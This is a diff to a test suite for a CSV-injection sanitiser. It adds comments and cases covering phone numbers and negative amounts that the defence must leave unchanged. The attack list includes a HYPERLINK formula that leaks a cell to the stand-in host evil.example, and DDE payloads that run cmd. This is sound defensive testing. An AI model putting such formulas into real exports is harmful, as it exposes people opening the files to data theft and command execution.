@@ -18,6 +18,8 @@ describe("CSV injection — payloads are neutralised", () => {
   const PAYLOADS = [
     '=HYPERLINK("http://evil.example/?leak="&A1,"Click for refund")',
     "=1+1",
+    // A signed lead followed by something that is NOT a number — still a formula. This is the line the
+    // numeric guard must not blur: "+27821234567" is data, "+1+cmd|…" is an attack.
     "+1+cmd|'/c calc'!A0",
     "-1+cmd|'/c calc'!A0",
     "@SUM(1+9)*cmd|'/c calc'!A0",
@@ -47,10 +49,25 @@ describe("CSV injection — payloads are neutralised", () => {
 describe("CSV injection — REAL DATA is never mangled", () => {
   // The overreach cases. A defence that corrupts money is worse than the attack it prevents.
   const REAL = [
-    "-6600.50",       // a NEGATIVE RENT. Stripping the minus flips it positive — the bug the poison harness caught.
+    // NEGATIVE AMOUNTS. Stripping the minus flips them positive — the bug the poison harness caught.
+    "-6600.50",
     "-1234",
     "-0.01",
     "-1 234,56",      // af-ZA negative
+
+    // PHONE NUMBERS IN E.164 — the format every SA agency export emits. Stripping the plus leaves
+    // "27821234567", which is neither local (082…) nor international, and every SMS and WhatsApp path
+    // downstream then holds a number that reaches NOBODY.
+    //
+    // This suite originally covered the minus and NOT the plus: it tested the lead I had already fixed and
+    // omitted the one that was still broken, so there was no test that could fail. The pre-PR walk found it.
+    "+27821234567",
+    "+27 82 123 4567",
+    "+27-82-123-4567",
+    "+1234",
+    "+27 (82) 123 4567",
+    "(6 600,50)",       // accounting negative
+
     "6600.50",
     "Smith",
     "Unit 3, Sea Point",
